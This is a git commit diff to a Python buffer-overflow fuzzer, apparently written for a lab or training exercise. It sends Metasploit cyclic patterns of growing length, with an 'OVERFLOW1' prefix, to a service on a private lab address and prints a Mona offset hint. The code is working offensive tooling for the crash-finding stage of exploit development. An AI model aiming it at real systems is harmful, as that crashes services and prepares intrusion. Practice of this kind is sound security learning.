bb8c94eaee4202f06d97c4520fe1015172b91d87
Chris Pritchard <chris@grislygrotto.nz>
2021-08-04 11:19:19 +1200

    tweaks and improvements

--- bufferoverflows/fuzzer.py
+++ bufferoverflows/fuzzer.py
@@ -1,26 +1,31 @@
-import socket, time, sys
+import socket, time, sys, subprocess
 
-ip = "10.10.28.38"
+patterncreate = "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb"
+ip = "10.10.93.84"
 port = 1337
 timeout = 5
+prefix = "OVERFLOW1 "
 
-buffer = []
-counter = 100
-while len(buffer) < 30:
-    buffer.append("A" * counter)
-    counter += 100
+print(prefix)
 
-for string in buffer:
+n = 1
+while n <= 30:
+    child = subprocess.Popen([patterncreate,'-l',str(n*100)], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+    buffer = str(child.stdout.read())
+
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(timeout)
         connect = s.connect((ip, port))
         s.recv(1024)
-        print("Fuzzing with %s bytes" % len(string))
-        s.send("OVERFLOW1 " + string + "\r\n")
+        print("Fuzzing with %s bytes" % len(buffer))
+        s.send(prefix + buffer + "\r\n")
         s.recv(1024)
         s.close()
     except:
-        print("Could not connect to " + ip + ":" + str(port))
+        print("Could not connect to %s:%s" % (ip, port))
+        print("Test with: !mona findmsp -distance %s" % len(buffer))
         sys.exit(0)
+
     time.sleep(1)
+    n += 1
